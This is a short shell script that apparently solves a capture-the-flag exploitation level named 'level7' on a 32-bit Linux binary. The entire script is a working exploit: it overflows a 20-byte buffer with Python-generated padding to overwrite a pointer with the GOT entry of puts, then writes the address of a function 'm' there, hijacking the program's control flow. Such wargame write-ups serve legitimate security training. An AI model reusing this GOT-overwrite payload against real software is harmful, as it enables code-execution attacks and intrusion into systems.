#!/bin/sh

# REQUIREMENTS:
# Python must be installed
# Must be on a x86, 32bit Linux architecture.

ADDRESS_GOT_PUTS="\x28\x99\x04\x08"
ADDRESS_M="\xf4\x84\x04\x08"

/home/user/level7/level7 $(python -c "print 'A' * 20 + '$ADDRESS_GOT_PUTS'") $(python -c "print '$ADDRESS_M'")
